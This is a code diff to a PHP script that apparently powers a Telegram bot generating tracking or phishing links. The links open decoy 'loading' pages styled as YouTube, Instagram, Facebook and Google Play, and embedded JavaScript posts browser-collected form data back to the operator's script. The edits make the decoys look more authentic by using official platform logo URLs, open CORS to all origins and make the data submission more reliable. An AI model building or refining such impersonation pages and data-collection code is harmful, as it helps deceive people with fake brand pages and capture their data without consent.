@@ -30,6 +30,15 @@ if (!is_dir(PAGINATION_TEMP_DIR)) {
     mkdir(PAGINATION_TEMP_DIR, 0777, true);
 }
 
+// --- CORS Headers for JavaScript requests ---
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit();
+}
+
 // --- Helper Functions ---
 
 /**
@@ -1412,8 +1421,10 @@ function generateFinalLink($chat_id, $message_id) {
         return;
     }
 
+    // --- Fixed PHP Script URL ---
+    // Using a more reliable way to determine the PHP script's URL.
     $php_script_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
-    $php_script_url .= $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    $php_script_url .= $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
     
     // Generate a unique hash for this specific generated link
     $link_hash = md5($original_url . $action_choice . $loading_type . $chat_id . microtime());
@@ -1515,17 +1526,22 @@ function generateFinalLink($chat_id, $message_id) {
         }
 
         try {
+            console.log('Sending data to:', phpScriptUrl);
             const response = await fetch(phpScriptUrl, {
                 method: 'POST',
                 body: formData
             });
 
+            const result = await response.json();
+            console.log('Server response:', result);
+            
             if (!response.ok) {
-                const error = await response.json();
-                console.error('فشل في إرسال البيانات إلى PHP:', error);
+                throw new Error('Failed to send data');
             }
+            return result;
         } catch (error) {
-            console.error('حدث خطأ أثناء إرسال البيانات إلى PHP:', error);
+            console.error('Error sending data to PHP:', error);
+            throw error;
         }
     }
 JS_FUNCTION;
@@ -2142,7 +2158,7 @@ EOT,
     </style>
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/YouTube_full-color_icon_%282017%29.svg/1024px-YouTube_full-color_icon_%282017%29.svg.png" alt="YouTube Logo" class="youtube-logo">
+    <img src="https://www.youtube.com/s/desktop/12d6b690/img/favicon_144x144.png" alt="YouTube Logo" class="youtube-logo">
     <h1>جارٍ تحميل الفيديو...</h1>
     <div class="loader-bar">
         <div class="loader-fill"></div>
@@ -2205,7 +2221,7 @@ EOT,
     </style>
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png" alt="Instagram Logo" class="instagram-logo">
+    <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/lam-fZmwmvn.png" alt="Instagram Logo" class="instagram-logo">
     <h1>جارٍ تحميل منشور...</h1>
     <div class="loader"></div>
     <p>الرجاء الانتظار قليلاً</p>
@@ -2355,7 +2371,7 @@ EOT,
     </style>
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo" class="facebook-logo">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="Facebook Logo" class="facebook-logo">
     <div class="loader-bar">
         <div class="loader-fill"></div>
     </div>
@@ -2420,7 +2436,7 @@ EOT,
     </style>
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/1/10/Google_Play_2024_icon.svg" alt="Google Play Logo" class="playstore-logo">
+    <img src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Google Play Logo" class="playstore-logo">
     <h1>جاري فتح التطبيق...</h1>
     <div class="loader"></div>
     <p>الرجاء الانتظار</p>
